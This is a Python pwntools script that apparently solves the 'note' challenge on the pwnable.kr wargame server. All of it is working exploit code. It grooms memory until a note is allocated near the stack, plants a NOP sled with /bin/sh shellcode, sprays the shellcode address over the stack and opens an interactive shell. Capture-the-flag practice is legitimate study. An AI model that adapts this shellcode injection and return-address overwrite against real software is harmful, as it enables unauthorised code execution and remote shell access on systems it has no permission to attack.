from pwn import *

# r = process("./note")
r = remote("pwnable.kr", 9019)


def recv_menu():
    r.recvuntil(b"5. exit\n")


def create_note():
    recv_menu()
    r.sendline(b"1")
    r.recvuntil(b"no ")
    addr_no = int(r.recvline().strip(), 10)
    r.recvuntil(b" [")
    addr = int(r.recvuntil(b"]")[:-1], 16)
    success("Create " + str(addr_no) + " note at: " + hex(addr))
    return addr_no, addr


def write_note(no: int, msg: bytes):
    recv_menu()
    r.sendline(b"2")
    r.recvuntil(b"note no?\n")
    r.sendline(str(no).encode("utf-8"))
    r.recvuntil(b"paste your note (MAX : 4096 byte)\n")
    r.sendline(msg)


def delete_note(no: int):
    recv_menu()
    r.sendline(b"4")
    r.recvuntil(b"note no?\n")
    r.sendline(str(no).encode("utf-8"))
    success("Delete note: " + str(no))


sleep(10)
stack_addr = 0xFFFFFFFF
stack_no = 0

while True:
    no, addr = create_note()
    if no == 255:
        for i in range(256):
            delete_note(i)
        stack_addr -= 0x430 * 255
    stack_addr -= 0x430
    if addr > stack_addr:
        stack_no = no
        stack_addr = addr
        break
    success("Heap at: " + hex(addr) + "...." + "Stack at: " + hex(stack_addr))

shellcode = asm(shellcraft.sh())
shellcode_no, shellcode_addr = create_note()
write_note(shellcode_no, b"\x90" * 200 + shellcode)

write_note(stack_no, p32(shellcode_addr) * 1024)
recv_menu()
r.sendline(b"5")
r.interactive()
